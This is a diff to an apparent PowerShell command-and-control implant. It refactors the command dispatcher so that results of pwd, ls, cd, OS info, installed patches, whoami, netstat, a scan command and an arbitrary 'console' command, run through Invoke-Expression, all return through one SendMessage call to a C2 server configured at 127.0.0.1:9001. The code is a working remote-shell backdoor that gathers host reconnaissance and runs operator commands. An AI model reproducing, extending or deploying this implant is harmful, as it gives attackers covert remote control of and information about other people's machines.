@@ -4,8 +4,6 @@ $C2_SERVER = "127.0.0.1"
 $C2_PORT = 9001
 # Max attempts to retry a failed connection before exiting
 $MAX_RETRIES = 10
-# Flag to exit the program
-$EXIT = $false
 
 # Given a data stream, send a String message to another host
 function SendMessage($stream, $msg)
@@ -54,39 +52,33 @@ function ProcessCommand($msg, $stream)
 {
     switch -Wildcard ($msg) {
         "pwd" {
-            SendMessage $stream $pwd.Path
+            $response = $pwd.Path
             break
         }
         "ls" {
             $response = CmdLS
             Write-Host $response
-            SendMessage $stream $response
             break
         }
         "cd*" {
             $response = $msg.SubString(3, $msg.Length - 3)
             Set-Location $response
-            SendMessage $stream $response
             break
         }
         "getos" {
             $response = CmdOSInfo
-            SendMessage $stream $response
             break
         }
         "getpatch" {
             $response = Get-HotFix | Out-String
-            SendMessage $stream $response
             break
         }
         "whoami" {
             $response = $env:ComputerName + "\" + $env:UserName
-            SendMessage $stream $response
             break
         }
         "netstat" {
             $response = Get-NetTCPConnection | Out-String
-            SendMessage $stream $response
             break
         }
         "scan*" {
@@ -96,7 +88,6 @@ function ProcessCommand($msg, $stream)
 
             $response = Invoke-Expression($exp) | Out-String
 
-            SendMessage $stream $response
             break
         }
         "console*" {
@@ -108,8 +99,6 @@ function ProcessCommand($msg, $stream)
             catch {
                 $response = "Command error"
             }
-
-            SendMessage $stream $response
                 
             break
         }
@@ -123,14 +112,15 @@ function ProcessCommand($msg, $stream)
             exit 1
         }
         "ret" {
-            SendMessage $stream "Leaving session active..."
+            $response = "Leaving session active..."
             break
         }
         default {
-            Write-Host "Command not recognized"
-            SendMessage $stream "Command not recognized"
+            $response = "Command not recognized"
         }
     }
+
+    SendMessage $stream $response
 }
 
 function ServerConnect()
